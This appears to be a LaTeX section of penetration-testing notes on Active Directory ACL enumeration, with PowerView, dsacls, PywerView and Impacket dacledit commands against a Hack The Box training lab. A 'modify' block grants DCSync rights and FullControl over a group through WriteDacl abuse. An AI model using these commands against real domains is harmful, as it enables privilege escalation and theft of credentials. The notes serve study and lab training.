\section{ACL Discovery}

The principle is to start for each account controlled to check their ACL and if an interesstin right is available on another account continue the path to see where it can leads. Remember to check Nested groups.

\subsection{ACL of an AD Object}
\subsubsection{dsacls}

\begin{verbatim}
dsacls.exe "cn=Yolanda,cn=users,dc=inlanefreight,dc=local"
dsacls.exe "cn=Yolanda,cn=users,dc=inlanefreight,dc=local" | Select-String "Pedro" -Context 1,10
\end{verbatim}


\subsubsection{PowerShell}
requiere \verb+DirectoryServices+ and \verb+ActiveDirectorySecurity+
\begin{verbatim}
$directorySearcher = New-Object System.DirectoryServices.DirectorySearcher('(samaccountname=Yolanda)')
$directorySearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Owner
$binarySecurityDescriptor = $directorySearcher.FindOne().Properties.ntsecuritydescriptor[0]
Write-Host -NoNewline $binarySecurityDescriptor

$parsedSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
$parsedSecurityDescriptor.SetSecurityDescriptorBinaryForm($binarySecurityDescriptor)
$parsedSecurityDescriptor.Access

$parsedSecurityDescriptor.Access | Where-Object {$_.IdentityReference -like '*Pedro*'}
\end{verbatim}

\subsubsection{ADACLScanner}
 \href{https://github.com/canix1/ADACLScanner}{ADACLScanner}
    
\subsubsection{PywerView}
\href{https://github.com/the-useless-one/pywerview}{PywerView}
\begin{verbatim}
./pywerview.py get-objectacl \
    -t <dc_ip> -w <domain_fqdn> -u <user> -p <password> \
    --resolve-sids --resolve-guids [--json] \
    -name <target>
\end{verbatim}

\subsubsection{Powerview}

PowerView \verb+Get-DomainObjectAcl+~\ref{tool:powerview:ACL_enum}

\begin{verbatim}
$sid = Convert-NameToSid <user>; Get-DomainObjectACL -resolveGUIDs -Identity * |
    ? {$_.SecurityIdentifier -eq $sid}

$sid = Convert-NameToSid <user>; Get-DomainObjectACL -resolveGUIDs -Identity <target> |
    ? {$_.SecurityIdentifier -eq $sid}

Get-DomainObjectAcl -Identity joe.evans -resolveGUIDs |
    where ActiveDirectoryRights -match 'GenericAll' |
    Select-Object -ExpandProperty SecurityIdentifier |
    Select -ExpandProperty value |
    Convert-SidToName
\end{verbatim}

\subsubsection{Impacket dacledit}
Impacket \verb+dacledit+~\ref{tool:impacket:dacledit}

enum:
\begin{verbatim}
python3 examples/dacledit.py \
    -target htb-student \
    -dc-ip 10.129.205.81 inlanefreight.local/htb-student:'HTB_@cademy_stdnt!'
python3 examples/dacledit.py \
    -principal pedro \
    -target Rita \
    -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
\end{verbatim}

modify:
\begin{verbatim}
python3 examples/dacledit.py \
    -principal luna \
    -target-dn dc=inlanefreight,dc=local \
    -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 \
    -action write -rights DCSync

# take full controle when WriteDacl
python3 examples/dacledit.py \
    -principal luna \
    -target "Finance" \
    -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 \
    -action write [-rights FullControl]

\end{verbatim}

\subsubsection{Foreign ACL Principals}
\begin{verbatim}
    $Domain = "inlanefreight.ad"
    $DomainSid = Get-DomainSid $Domain
    
    Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * | ? { 
        ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and `
        ($_.AceType -match 'AccessAllowed') -and `
        ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and `
        ($_.SecurityIdentifier -notmatch $DomainSid)
    } 
\end{verbatim}


\subsection{ACL of a process}
\subsubsection{Using AccessChk}

\begin{verbatim}
.\accesschk64.exe -p "explorer.exe" -l
\end{verbatim}

